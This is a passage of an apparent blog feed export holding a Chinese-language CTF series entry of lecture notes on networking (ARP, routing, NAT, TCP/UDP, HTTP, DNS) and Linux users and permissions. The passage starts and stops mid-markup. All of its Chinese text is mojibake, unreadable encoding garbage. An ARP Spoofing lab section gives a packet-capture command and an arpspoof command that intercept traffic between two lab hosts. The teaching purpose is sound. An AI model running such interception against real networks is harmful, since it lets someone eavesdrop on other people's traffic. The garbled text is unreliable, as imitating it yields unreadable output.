ä¸€äº›é…·é…·çš„æ¯”è³½(<del>å¯æ˜¯æœ€è¿‘çœŸçš„åƒåŠ å¤ªå¤šæ´»å‹•å¤ªå¤šäº† RRRRRRRR</del>)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;ä¸‰åå¤©äº†ï¼ ä»Šå¤©å°±å¯«å…­é¡Œ Crypto çš„ Writeup ï¼Œæœ€å¾Œå†ä¾†å€‹å°å°ç¸½çµ&lt;/p&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day29</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day29/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day29/</id>
    <published>2024-10-01T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></label></li></ul><span id="more"></span><h2 id="æ·ºè«‡ç¶²è·¯èˆ‡-h-t-t-p">æ·ºè«‡ç¶²è·¯èˆ‡ H T T P <a href="#æ·ºè«‡ç¶²è·¯èˆ‡-h-t-t-p" class="headerlink"></a></h2><h3 id="ä»€éº¼æ˜¯ç¶²è·¯">ä»€éº¼æ˜¯ç¶²è·¯ï¼Ÿ <a href="#ä»€éº¼æ˜¯ç¶²è·¯" class="headerlink"></a></h3><p>ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠå¾ˆå¤šå°é›»è…¦ç”¨ç¶²è·¯ç·šæˆ–æ˜¯ WIFIä¸²é€£åœ¨ä¸€èµ·å°±æ˜¯æ‰€è¬‚çš„ç¶²è·¯äº†</p><p>å¯ä»¥æ¯”å–»ç‚ºä¸€å€‹é€ä¿¡çš„éç¨‹</p><ol type="1"><li>æ’°å¯«ä¿¡ä»¶å…§å®¹</li><li>æ”¾é€²ä¿¡å°æ±ºå®šè¦æ›è™Ÿé‚„æ˜¯å¹³ä¿¡ï¼Œé‚„æœ‰å¯„çµ¦èª°</li><li>å­£è¦‹åº•æ­¢å’Œæ”¶ä»¶åœ°å€</li><li>æŠŠä¿¡çµ¦éƒµå±€ï¼Œç„¶å¾Œè½‰ç™¼åˆ°å…¶ä»–éƒµå±€å†é€åˆ°æ”¶ä»¶äººæ‰‹ä¸Šï¼ˆå¦‚æœä½ è¦é€çš„äººå°±åœ¨ä½ å®¶éš”å£ï¼Œä½ å°±ç›´æ¥çµ¦ä»–å°±å¥½äº†ï¼‰</li></ol><p>ç¶²è·¯ä¹Ÿæ˜¯ä¸€æ¨£çš„æ¦‚å¿µï¼Œå‡è¨­è¦å»ç€è¦½ Google é€™å€‹ç¶²ç«™</p><ol type="1"><li>Application layer (ä¿¡ä»¶å…§å®¹)<br><img data-src="https://i.imgur.com/TyrNoiL.png" alt="Image"></li><li>Transport layer (ä¿¡å°)<br><img data-src="https://i.imgur.com/Mh6F6Ru.png" alt="Image"></li><li>Network layer (å¯„ä»¶äººå’Œæ”¶ä»¶äºº)<br><img data-src="https://i.imgur.com/ctf7Io9.png" alt="Image"><br><img data-src="https://i.imgur.com/BJAtXDq.png" alt="Image"></li><li>Link layer (éƒµå±€)<br><img data-src="https://i.imgur.com/WjtMKGY.png" alt="Image"></li></ol><h3 id="ä»€éº¼äº‹-mac-address">ä»€éº¼äº‹ Mac Address <a href="#ä»€éº¼äº‹-mac-address" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/guXiiJc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>è·Ÿ IP çš„å·®ç•°æ˜¯ IP æ˜¯å¯ä»¥è®Šå‹•çš„ï¼Œ Mac Addressæ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥åœ¨å€åŸŸç¶²è·¯è£¡é¢æ˜¯æª¢æŸ¥ Mac Address çš„ï¼Œè€Œä¸æ˜¯ IP Address</p><p>åœ¨å¤ä»£æ²’æœ‰ Switch çš„æ™‚å€™ï¼Œ é©ç”¨ Hub ä¾†é€£æ¥å¤šå°é›»è…¦ï¼Œä½†æ˜¯ Hubæ˜¯æ²’æœ‰è…¦è¢‹çš„ï¼Œä»–æœƒæŠŠä¿¡é€çµ¦æ‰€æœ‰äººï¼Œæ¯å°é›»è…¦æœƒæª¢æŸ¥ Mac Addressçœ‹é‚£å°ä¿¡æ˜¯ä¸æ˜¯å¯„çµ¦è‡ªå·±çš„ï¼Œå¦‚æœæ˜¯å°±æ¥æ”¶ï¼Œå¦‚æœä¸æ˜¯å°±ä¸Ÿæ‰</p><figure><img data-src="https://i.imgur.com/r575Pbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åœ¨æœ‰ Switch å¾Œå°±åªæœƒæŠŠä¿¡é€çµ¦å°çš„äºº</p><figure><img data-src="https://i.imgur.com/TZKfGgs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä½†åœ¨æˆ‘å€‘ç€è¦½ç¶²é æ˜¯ç”¨ IP Address ä¾†æ‰¾åˆ°å°æ–¹çš„ï¼Œè¦æ‰¾åˆ°å°æ–¹çš„ MacAddress å°±è¦ç”¨ ARP å”å®š</p><p><img data-src="https://i.imgur.com/NIA1F6B.png" alt="Image"><br><img data-src="https://i.imgur.com/R8bhGIW.png" alt="Image"></p><p>æœƒæœ‰ä¸€å€‹ ARP Table ä¾†è¨˜éŒ„å°æ–¹çš„ MacAddressï¼Œå›ºå®šä¸€æ®µæ™‚é–“å¾Œæœƒæ¸…ç†å’Œæ›´æ–°</p><p>æœƒä¸æœƒæœ‰è³‡å®‰å•é¡Œï¼Ÿ<br>æœƒçš„ï¼Œå¦‚æœåœ¨æˆ‘å•ç›®æ¨™çš„ Mac Address æ™‚ï¼Œæœ‰å£äººé¨™æˆ‘èªªä»–æ˜¯ç›®æ¨™çš„ MacAddressï¼Œé€™æ¨£å°±æœƒæŠŠä¿¡é€çµ¦å£äººï¼Œé€™å°±æ˜¯ ARP Spoofing</p><figure><img data-src="https://i.imgur.com/3uRI4Kk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---arp-spoofing">Lab - ARP Spoofing <a href="#lab---arp-spoofing" class="headerlink"></a></h3><p>Lab é—œæ‰äº†ä¸èƒ½ç© ğŸ˜¥</p><figure><img data-src="https://i.imgur.com/2dhPc7O.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -Ai eth1</span><br></pre></td></tr></tbody></table></figure><p>tcpdump å»è½å°åŒ…çš„å…§å®¹ï¼Œ <code>-A</code> æ˜¯æŠŠå°åŒ…çš„å…§å®¹é¡¯ç¤ºå‡ºä¾†ï¼Œ<code>-i</code> æ˜¯æŒ‡å®šç¶²å¡</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2</span><br></pre></td></tr></tbody></table></figure><p>é€™å€‹æŒ‡ä»¤å°±æœƒå¹«ä½ å¯¦ä½œ ARP Spoofing æŠŠ <code>192.168.111.1</code>è¦å‚³çµ¦ <code>192.168.111.2</code> çš„å°åŒ…æ””æˆª</p><figure><img data-src="https://i.imgur.com/zWABU43.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ä»€éº¼æ˜¯ç¶²è·¯---ç¶²æ®µ">ä»€éº¼æ˜¯ç¶²è·¯ - ç¶²æ®µ <a href="#ä»€éº¼æ˜¯ç¶²è·¯---ç¶²æ®µ" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/9Qut1Lg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šä¸‹æœ€ä¸åŒçš„æ˜¯ï¼Œä¸Šé¢çš„é€çš„äººæ˜¯å€åŸŸç¶²è·¯ï¼Œä¸‹é¢çš„æ˜¯é€çµ¦å€åŸŸå¤–çš„äººï¼Œæ‰€ä»¥ä»–æ˜¯è¦ç¶“éRouter ä¾†è½‰ç™¼çš„</p><p>ä¸€æ¨£ç”¨å¯„ä¿¡ä¾†æ¯”å–»</p><figure><img data-src="https://i.imgur.com/yFWXbH2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ckCjpOt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šä¸‹æœ€å¤§çš„å·®ç•°å°±æ˜¯åœ¨å€åŸŸå…§é‚„æ˜¯å€åŸŸå¤–ï¼Œåœ¨ç¶²è·¯å…§ä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œè¦æ€æ²’çœ‹æ˜¯åœ¨å€åŸŸå…§å¤–ç­‰ç­‰æœƒè¬›</p><figure><img data-src="https://i.imgur.com/2u1JCbv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xWRmV85.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¯ä»¥é€šéåˆ¤æ–·ç›®æ¨™ IP æ˜¯å¦æ˜¯å¯„çµ¦ Default Gatewayä¾†åˆ¤æ–·æ˜¯å€åŸŸå…§é‚„æ˜¯å€åŸŸå¤–</p><figure><img data-src="https://i.imgur.com/JfzeMAX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚ä½•çŸ¥é“ä¾†æº IP å’Œç›®æ¨™ IP æ˜¯ä¸æ˜¯åœ¨åŒä¸€å€‹ç¶²æ®µï¼Ÿ</p><figure><img data-src="https://i.imgur.com/QC3dXek.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æŠŠ Address å’Œ Netmask çš„äºŒé€²åˆ¶åš AND é‹ç®—ï¼Œå°±æœƒæ˜¯ Network IDï¼Œä¿—æœå…©å€‹ Network ID ä¸€æ¨£å°±æ˜¯åœ¨åŒä¸€å€‹ç¶²æ®µ (æ‰€ä»¥å¦‚æœ netmask æ˜¯<code>255.255.255.0</code> çš„è©±å…¶å¯¦å°±çœ‹ IPå‰ä¹ç¢¼æ˜¯ä¸æ˜¯éƒ½ä¸€æ¨£å°±çŸ¥é“æ˜¯ä¸æ˜¯åœ¨åŒå€åŸŸï¼Œå¦‚æœ netmask æ˜¯<code>255.255.0.0</code> å°±çœ‹ IP å‰å…­ç¢¼)</p><p><code>/24</code> çš„æ„æ€ <code>255.255.255.0</code> è½‰æˆäºŒé€²åˆ¶æ˜¯<code>11111111.11111111.11111111.00000000</code> ï¼Œå› ç‚ºæœ‰ 24 å€‹1ï¼Œå°±è¡¨ç¤ºæˆ <code>/24</code></p><h3 id="ä»€éº¼æ˜¯ç¶²è·¯---è·¯ç”±">ä»€éº¼æ˜¯ç¶²è·¯ - è·¯ç”± <a href="#ä»€éº¼æ˜¯ç¶²è·¯---è·¯ç”±" class="headerlink"></a></h3><p>è³‡æ–™é€åˆ° router æ™‚ï¼Œ router æœƒæ ¹æ“šä¸Šé¢çš„è·¯ç”±è¡¨å‚³é€ packetï¼Œè·¯ç”±æœƒæ ¹æ“šä»–çš„è·¯ç”±åœ°åœ–ä¾†æ±ºå®šè¦å‚³é€çµ¦èª°ï¼ˆå°±åƒæˆ‘å€‘å¯ä»¥åˆ©ç”¨ mtrçœ‹åˆ°æˆ‘å€‘è³‡æ–™æ˜¯æ€éº¼å‚³é€ç›®æ¨™çš„)</p><figure><img data-src="https://i.imgur.com/ARzYFfG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä¸Šé¢é€™å€‹å°±æ˜¯è·¯ç”±è¡¨ï¼Œå¦‚æœæ˜¯ 192.168.20.5 å°±æœƒé€šé 192.168.20.2å‡ºå»</p><figure><img data-src="https://i.imgur.com/hg8FCbD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>router table æœƒä»¥ netmask æœ€é•·çš„ç‚ºå„ªå…ˆ</p><p>default gateway å°±æ˜¯ <code>0.0.0.0/0</code> çš„ç¸®å¯«ï¼Œé‚£å¦‚æœæ²’æœ‰default gateway å°±æœƒæ‰¾ä¸åˆ°è·¯å¾‘ï¼Œå°±æœƒå‡ºç¾<code>Destination Host Unreachable</code></p><h3 id="tcp-vs-udp">TCP vs UDP <a href="#tcp-vs-udp" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/GzBbOug.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="udp">UDP <a href="#udp" class="headerlink"></a></h4><p>å°±æ˜¯ç›´æ¥ä¸Ÿéå»ï¼Œä¸ç®¡æœ‰æ²’æœ‰çœŸçš„æ”¶åˆ°</p><figure><img data-src="https://i.imgur.com/tdKM6ao.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="tcp">TCP <a href="#tcp" class="headerlink"></a></h4><p>å¦‚æœéœ€è¦å¯é ä¿¡å‚³é€ï¼Œè¦æ˜¯è³‡æ–™å¾ˆå¤§ç”¨ UDP å‚³éå»å¯èƒ½å°±æœƒå¾ˆç ´ç¢ï¼ŒTCPå°±æœƒæ¯æ¬¡éƒ½ç¢ºèªæœ‰æ²’æœ‰æ”¶åˆ°ï¼Œæœ‰æ”¶åˆ°å¾Œæ‰æœƒå‚³ä¸‹ä¸€å€‹</p><figure><img data-src="https://i.imgur.com/MEndg57.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/Xj2Qrqw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9wLfeyg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RJqKk88.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å› ç‚º TCP çš„æ•ˆèƒ½æœ‰é»å·®ï¼Œç¾åœ¨æœ‰ä¸€å€‹å«åš QUIC çš„å”å®šï¼Œä»–æ˜¯åŸºæ–¼ UDPçš„ï¼Œä½†æ˜¯ä»–æœ‰ TCP çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ•ˆèƒ½æœƒæ¯”è¼ƒå¥½</p><h3 id="port">Port <a href="#port" class="headerlink"></a></h3><p>å› ç‚ºä¸€å°é›»è…¦ä¸Šæœ‰å¾ˆå¤šç¨‹å¼ï¼Œæ‰€ä»¥è¦ç”¨ Port ä¾†å€åˆ†ï¼Œæ¯å€‹æœå‹™éƒ½æœ‰è‡ªå·±çš„Portï¼Œåƒæ˜¯ HTTP é è¨­æ˜¯ 80ï¼ŒHTTPS æ˜¯ 443</p><h3 id="nat">NAT <a href="#nat" class="headerlink"></a></h3><p>ç¾ä»Š IPv4 æœ€åš´é‡çš„å•é¡Œï¼Œå°±æ˜¯ IP æ•¸é‡ä¸å¤ ç”¨ï¼Œå› ç‚º IP æœ€å¤šå°±åªæœ‰<code>2^32</code> å€‹ï¼Œä¹Ÿå°±æ˜¯ <code>4,294,967,296</code> å€‹ï¼Œè€Œä¸”é‚„æœ‰ä¸€äº›IPæ˜¯ä¸èƒ½ç”¨çš„ï¼Œå¾ˆæ˜é¡¯ä¸å¯èƒ½è®“åœ°çƒä¸Šæ¯å€‹äººéƒ½èƒ½ç”¨ï¼Œé€™æ¨£å°±æœƒæœ‰äº›äººæ²’æœ‰è¾¦æ³•ç”¨ç¶²è·¯ï¼Œæ‰€ä»¥å°±æœ‰å…©å€‹è¾¦æ³•</p><ol type="1"><li>æ›ä¸€å€‹ IP çš„å”è­°: IPv6ï¼Œä½†å› ç‚ºç›®å‰å¾ˆå¤šæœå‹™éƒ½æ˜¯æ¶åœ¨ IPv4ä¸Šï¼Œå¤§å®¶ä¹Ÿéƒ½é‚„ç¿’æ…£ç”¨ IPv4ï¼Œæ‰€ä»¥çŸ­æœŸé–“å°±åªèƒ½ç”¨ä¸‹é¢é‚£å€‹æ–¹æ³•</li><li>NAT: æ—¢ç„¶æˆ‘å€‘ IP ä¸å¤ ç”¨ï¼Œé‚£å°±è®“ä¸€äº›é›»è…¦æœ‰ IP å°±å¥½ï¼Œå…¶ä»–é›»è…¦ç”¨å‡çš„IP<br><img data-src="https://i.imgur.com/kNC761j.png" alt="Image"><br><img data-src="https://i.imgur.com/mVPj0YS.png" alt="Image"><br>Router æœƒæœ‰ä¸€å€‹ NAT Table ä¾†è¨˜éŒ„æ¯å€‹è«‹æ±‚çš„ Source IP å’Œ DestinationIPï¼Œç„¶å¾Œå†æŠŠ Source IP æ”¹æˆ Router çš„IPï¼Œç„¶å¾Œå†æŠŠå°åŒ…é€å‡ºå»ï¼Œç•¶å°æ–¹å›æ‡‰æ™‚ï¼Œ Router æœƒæ ¹æ“š NAT TableæŠŠå°åŒ…é€åˆ°å°æ‡‰çš„é›»è…¦<br>ä½†é€™æ¨£é‚„æœ‰å€‹å•é¡Œï¼Œå¦‚æœæœ‰å€‹ Server æ¶åœ¨ NATå¾Œé¢ï¼Œå¤–é¢å°±æˆ³ä¸åˆ°ï¼Œè§£æ±ºçš„æ–¹æ³•å°±æ˜¯ Port Forwarding<br><img data-src="https://i.imgur.com/DbLNxvt.png" alt="Image"><br><img data-src="https://i.imgur.com/Vr2qpuD.png" alt="Image"><br>æœƒæŠŠå¤–é¢é€é€²æ‹‰çš„ Port è½‰æ›æˆå°æ‡‰çš„å…§éƒ¨ IP<br><a href="https://youtu.be/xleMUfUYbGw">How does NAT work</a></li></ol><h3 id="ä»€éº¼æ˜¯å”å®š">ä»€éº¼æ˜¯å”å®š <a href="#ä»€éº¼æ˜¯å”å®š" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RSNrYo5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="http">HTTP <a href="#http" class="headerlink"></a></h4><blockquote><p>HTTP/2 ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ä¸€ç¨®å»ºç«‹åœ¨ TCP ä¸Šçš„å‚³è¼¸å”å®šã€‚(HTTP/3ä¾‹å¤–ï¼Œä»Šå¤©ä¸æ)<br>ç‚ºä½•éœ€è¦ä½¿ç”¨ TCP æ˜¯å› ç‚ºç¶²é ä»–æœƒéœ€è¦å¯é æ€§çš„å‚³è¼¸ã€‚</p></blockquote><figure><img data-src="https://i.imgur.com/ofobafe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="request">Request <a href="#request" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/sPrrISD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>è·¯å¾‘å°±æ˜¯æƒ³è¦æª”æ¡ˆçš„ä½ç½®</p><h5 id="response">Response <a href="#response" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/VRbe3Ws.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>status code:2 é–‹é ­æˆåŠŸï¼Œ3 é–‹é ­é‡æ–°å°å‘ï¼Œ4 é–‹é ­å®¢æˆ¶ç«¯éŒ¯èª¤ï¼Œ5 é–‹é ­ä¼ºæœå™¨éŒ¯èª¤</p><h5 id="http-lab">HTTP Lab <a href="#http-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/i7lPkRs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P1HGD39.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Methods">HTTPMethod</a></p><h4 id="dns">DNS <a href="#dns" class="headerlink"></a></h4><blockquote><p>å…¨åå«åš Domain Name Systemï¼Œæ˜¯ä¸€ç¨®å»ºç«‹åœ¨ UDP çš„å”å®šã€‚<br>ä¸»è¦ç”¨ä¾†æŸ¥è©¢ Domain Name çš„ IP Address æˆ–æ˜¯æŸ¥è©¢ IP Address å°æ‡‰çš„ DomainNameã€‚<br>é‚£ä»€éº¼æ˜¯ Domain Name å‘¢ï¼Ÿ</p></blockquote><figure><img data-src="https://i.imgur.com/P1axnwy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/63XpbUD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="dns-lab">DNS Lab <a href="#dns-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/ezlp25H.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/25rSqEN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="linux-åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†">Linux åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç† <a href="#linux-åŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†" class="headerlink"></a></h2><figure><img data-src="https://i.imgur.com/crswIVm.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="kernel-space-vs-user-space">Kernel Space vs User Space <a href="#kernel-space-vs-user-space" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/Cmt2y72.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å€åˆ†æˆé€™æ¨£æ˜¯ç‚ºäº†è®“ Kernel æ–¹ä¾¿ç®¡ç† User Space çš„ Applicationï¼Œé¿å…æœ‰äº› Application æ¶è³‡æºï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”± Kernel Spaceåœæ­¢é‚£äº›æŒ‡ä»¤é‹è¡Œ</p><h3 id="shell">Shell <a href="#shell" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RFSND8t.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ssh">SSH <a href="#ssh" class="headerlink"></a></h3><p>Secure Shell Protocol</p><figure><img data-src="https://i.imgur.com/L8lFFSA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://blog.gtwang.org/linux/linux-ssh-public-key-authentication/">SSHé‡‘é‘°ç™»å…¥ å°±ä¸ç”¨æ‰“å¯†ç¢¼äº†</a></p><h3 id="linux-ç›®éŒ„æ¶æ§‹">Linux ç›®éŒ„æ¶æ§‹ <a href="#linux-ç›®éŒ„æ¶æ§‹" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/aIJTb9C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æª”æ¡ˆç¨®é¡">æª”æ¡ˆç¨®é¡ <a href="#æª”æ¡ˆç¨®é¡" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/2dh0cQk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="æ­£è¦æª”æ¡ˆ-regular-file">æ­£è¦æª”æ¡ˆ (Regular File) <a href="#æ­£è¦æª”æ¡ˆ-regular-file" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>-</code></li><li>ç´”æ–‡å­—æª” (ASCII)ã€äºŒé€²ä½æª” (binary)ã€è³‡æ–™æ ¼å¼æª” (data)</li></ul><h4 id="ç›®éŒ„-directory">ç›®éŒ„ (Directory) <a href="#ç›®éŒ„-directory" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>d</code></li><li>å°±æ˜¯ç›®éŒ„</li></ul><h4 id="é€£çµæª”link">é€£çµæª” (link) <a href="#é€£çµæª”link" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼š<code>l</code></li><li>å°±åŒæ–¼ Windows ä¸‹çš„æ·å¾‘</li></ul><h4 id="è¨­å‚™èˆ‡è£ç½®æª”device">è¨­å‚™èˆ‡è£ç½®æª” (device) <a href="#è¨­å‚™èˆ‡è£ç½®æª”device" class="headerlink"></a></h4><ul><li>å€å¡Š (block) è¨­å‚™æª”<ul><li>æª”æ¡ˆé¡å‹ï¼šb</li><li>ç¡¬ç¢Ÿæˆ–å„²å­˜è¨­å‚™</li></ul></li><li>å­—å…ƒ (character) è¨­å‚™æª”<ul><li>æª”æ¡ˆé¡å‹ï¼šc</li><li>éµç›¤ã€æ»‘é¼ ç­‰</li></ul></li></ul><h4 id="è³‡æ–™æ¥å£æª”sockets">è³‡æ–™æ¥å£æª” (sockets) <a href="#è³‡æ–™æ¥å£æª”sockets" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼šs</li><li>è®“å…©å€‹ç¨‹å¼åšæºé€šï¼Œè®“ä¸€å€‹ç¨‹å¼æŠŠè³‡æ–™çŒé€² sockets ï¼Œå¦ä¸€å€‹ç¨‹å¼å°±å¯ä»¥å¾sockets æ‹¿è³‡æ–™</li></ul><h4 id="è³‡æ–™è¼¸é€æª”fifo-pipe">è³‡æ–™è¼¸é€æª” (FIFO, pipe) <a href="#è³‡æ–™è¼¸é€æª”fifo-pipe" class="headerlink"></a></h4><ul><li>æª”æ¡ˆé¡å‹ï¼šp</li><li>è®“ä¸åŒé€²ç¨‹é–“èƒ½æºé€š</li></ul><h3 id="ç”¨æˆ¶èˆ‡ç¾¤çµ„">ç”¨æˆ¶èˆ‡ç¾¤çµ„ <a href="#ç”¨æˆ¶èˆ‡ç¾¤çµ„" class="headerlink"></a></h3><p>ç”¨æˆ¶ï¼šå°±ç”¨æˆ¶<br>ç¾¤çµ„ï¼šä¸»ç¾¤çµ„å’Œé™„åŠ ç¾¤çµ„</p><h4 id="ç”¨æˆ¶-etcpassword">ç”¨æˆ¶ /etc/password <a href="#ç”¨æˆ¶-etcpassword" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/7j0LQsL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¯†ç¢¼ä¸æœƒå­˜åœ¨é€™ï¼Œæ‰€ä»¥ä¸Šé¢æ˜¯å¯« <code>x</code></p><h4 id="ç”¨æˆ¶-etcshadow">ç”¨æˆ¶ /etc/shadow <a href="#ç”¨æˆ¶-etcshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VBwPnAJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç¾¤çµ„-etcgroup">ç¾¤çµ„ /etc/group <a href="#ç¾¤çµ„-etcgroup" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/x6EP4D5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç¾¤çµ„-etcgshadow">ç¾¤çµ„ /etc/gshadow <a href="#ç¾¤çµ„-etcgshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/cb7ZUgf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="æ¬Šé™">æ¬Šé™ <a href="#æ¬Šé™" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/uYL8Ucw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="ç›®éŒ„çš„æ¬Šé™">ç›®éŒ„çš„æ¬Šé™ <a href="#ç›®éŒ„çš„æ¬Šé™" class="headerlink"></a></h4><blockquote><p>r ï¼š<br><br>è¡¨ç¤ºå…·æœ‰è®€å–ç›®éŒ„çµæ§‹æ¸…å–®çš„æ¬Šé™ï¼Œå¯ä»¥æŸ¥è©¢è©²ç›®éŒ„ä¸‹çš„æª”åè³‡æ–™ã€‚<br><br>w ï¼š<br><br>å»ºç«‹æ–°çš„æª”æ¡ˆèˆ‡ç›®éŒ„ï¼›<br><br>åˆªé™¤å·²ç¶“å­˜åœ¨çš„æª”æ¡ˆèˆ‡ç›®éŒ„ (ä¸è«–è©²æª”æ¡ˆçš„æ¬Šé™ç‚ºä½•ï¼)<br><br>å°‡å·²å­˜åœ¨çš„æª”æ¡ˆæˆ–ç›®éŒ„é€²è¡Œæ›´åï¼›<br><br>æ¬ç§»è©²ç›®éŒ„å…§çš„æª”æ¡ˆã€ç›®éŒ„ä½ç½®ã€‚<br><br>x (access directory)ï¼š<br><br>ä½¿ç”¨è€…èƒ½å¦é€²å…¥è©²ç›®éŒ„æˆç‚ºå·¥ä½œç›®éŒ„çš„ç”¨é€”ï¼ˆèƒ½å¦ cd é€²å…¥ï¼‰<br></p></blockquote><figure><img data-src="https://i.imgur.com/WrkLjvg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 